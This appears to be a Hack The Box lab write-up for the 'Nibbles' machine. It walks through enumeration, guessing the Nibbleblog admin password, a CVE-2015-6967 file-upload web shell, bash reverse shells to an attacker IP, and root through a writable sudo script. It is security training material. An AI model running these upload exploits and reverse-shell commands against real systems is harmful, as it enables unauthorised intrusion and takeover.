---
machine: Nibbles
platform: Hack The Box
category: Linux
difficulty: Easy
points: 20
tags: [nibbleblog, cve-2015-6967, file-upload, default-creds, sudo, privilege-escalation]
date: 2026-05-18
status: retired
summary: "An easy Linux box that rewards methodical web enumeration — uncovering a hidden, vulnerable blogging CMS for a foothold, then escalating through a classic writable-script sudo misconfiguration. A solid primer on CMS exploitation and Linux sudo privilege escalation."
---
## Enumeration

nmap scan:
```bash
┌──(kali㉿kali)-[~/htb/nibbles]
└─$ nmap -sCV 10.129.34.207 -oN nmapscan                            
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-18 08:24 -0400
Nmap scan report for 10.129.34.207
Host is up (0.038s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.31 seconds

```

Web server is the main point of interest, note version Apache 2.4.18

The web server is simple and just has an html body tag that says Hello world, when we check the source we see a comment mentioning `/nibbleblog/` so we are going to investigate that next.

On the blog page we see some infrastructure descriptions: `[Atom](http://10.129.34.207/nibbleblog/feed.php) · [Top](http://10.129.34.207/nibbleblog/#) · Powered by Nibbleblog`

`feed.php` doesn't seem to have anything useful, we can try researching nibbleblog for vulnerabilities to see if there's an exploitable issue (Often the case for small/niche webapp programs).

The most popular CVE CVE-2015-6967 says that remote administrators can achieve arbitrary code execution via exploiting the my_image plugin.  We first need to find a way to enter text or upload images into the blog though (Also become administrator).

After looking up common credential paths on nibbleblog, I see this: `In Nibbleblog, the XML file containing usernames is located at /content/private/users.xml`

When we look there we find
```xml
<users>
<user username="admin">
<id type="integer">0</id>
<session_fail_count type="integer">0</session_fail_count>
<session_date type="integer">1514544131</session_date>
</user>
<blacklist type="string" ip="10.10.10.1">
<date type="integer">1512964659</date>
<fail_count type="integer">1</fail_count>
</blacklist>
</users>
```

We see that our admin username is simply `admin`
If we go to the admin portal at /nibbles/admin.php, we can guess some common passwords, like `nibble`, `nibbles`, `admin`, `password` and we will find that the password is `nibbles` (I think this is a really poor intended solution for this part of the box)

## Foothold

When we access the portal, we can look at the public CVE exploit and figure out what it targets:

Referring to this exploit PoC (https://github.com/dix0nym/CVE-2015-6967/blob/main/exploit.py) we see in this function:
```python
def upload_shell(session, nibbleURL, payload):
	uploadURL = f"{nibbleURL}admin.php?controller=plugins&action=config&plugin=my_image"
	uploadPostResp = session.post(uploadURL, data={'plugin':'my_image','title':'My image','position':'4','caption':'capton','image_resize':'1','image_width':'230','image_height':'200','image_option':'auto'}, files={'image': ('nibbles.php', payload, 'application/x-php')}, timeout=30)
	if '<b>Warning</b>' in uploadPostResp.text:
		print('[+] Upload likely successfull.')
	else:
		print('[-] Upload likely failed.')
```
That the vulnerable mechanism (which we already know to be related to the my_image plugin) should be in plugins -> config -> my_image with a payload around where the image is uploaded.  

I simply got a php reverse shell (or so I thought), opened burpsuite and caught the post request to send to repeater in case I needed to tweak it, and uploaded my php payload.

After uploading it I went to this path to call the shell
```python
def execute_shell(session, nibbleURL):
	exploitURL = f"{nibbleURL}content/private/plugins/my_image/image.php"
	exploitResp = session.get(exploitURL)
```

And to my surprise was given, not a reverse shell to my listener, but a web shell on `http://10.129.34.207/nibbleblog/content/private/plugins/my_image/image.php`.  It seems the payload I got from revshells.com was actually a php web shell and not a reverse shell... Oops.

This can be easily remedied just from establishing a connection to my listener via bash via the web shell we have: `bash -c 'bash -i >& /dev/tcp/10.10.15.144/1337 0>&1'`

This gives us an actual reverse shell from our web shell:
```bash
──(kali㉿kali)-[~/htb/nibbles]
└─$ nc -lvnp 1337                                                   
listening on [any] 1337 ...
connect to [10.10.15.144] from (UNKNOWN) [10.129.34.207] 34990
bash: cannot set terminal process group (1365): Inappropriate ioctl for device
bash: no job control in this shell
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$   
```

We see that we have shell access as `nibbler`
```bash
<ml/nibbleblog/content/private/plugins/my_image$ whoami                      
nibbler
```

in `/home/nibbler` we see the user flag and an interesting zip file `personal.zip`

## Privilege Escalation

Running `sudo -l` to check for dangerous sudo permissions we see
```bash
nibbler@Nibbles:/home/nibbler$ sudo -l
sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

This means nibbler can run this process (which was in our zip file) as root AND anyone can edit it, I use sed to prepend this shellout command to the beginning of the script.

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ sed -i "1i bash -c 'bash -i >& /dev/tcp/10.10.15.144/2000 0>&1'" monitor.sh
<"1i bash -c 'bash -i >& /dev/tcp/10.10.15.144/2000 0>&1'" monitor.sh        
nibbler@Nibbles:/home/nibbler/personal/stuff$ cat monitor.sh    

cat monitor.sh
bash -c 'bash -i >& /dev/tcp/10.10.15.144/2000 0>&1'
                  ####################################################################################################
                  #                                        Tecmint_monitor.sh                                        #
                  # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/      #
                  # If any bug, report us in the link below                                                          #
                  # Free to use/edit/distribute the code below by                                                    #
                  # giving proper credit to Tecmint.com and Author                                                   #
                  #                                                                                                  #
                  ####################################################################################################
#! /bin/bash
# unset any variable which system may be using

```

Now I start my listener on port 2000 and run `sudo ./monitor.sh`

```bash
──(kali㉿kali)-[~/htb/nibbles]
└─$ nc -lvnp 2000    
listening on [any] 2000 ...
connect to [10.10.15.144] from (UNKNOWN) [10.129.34.207] 35970
bash: cannot set terminal process group (1365): Inappropriate ioctl for device
bash: no job control in this shell
root@Nibbles:/home/nibbler/personal/stuff# 

```

Now we have a root reverse shell and can get the root flag.
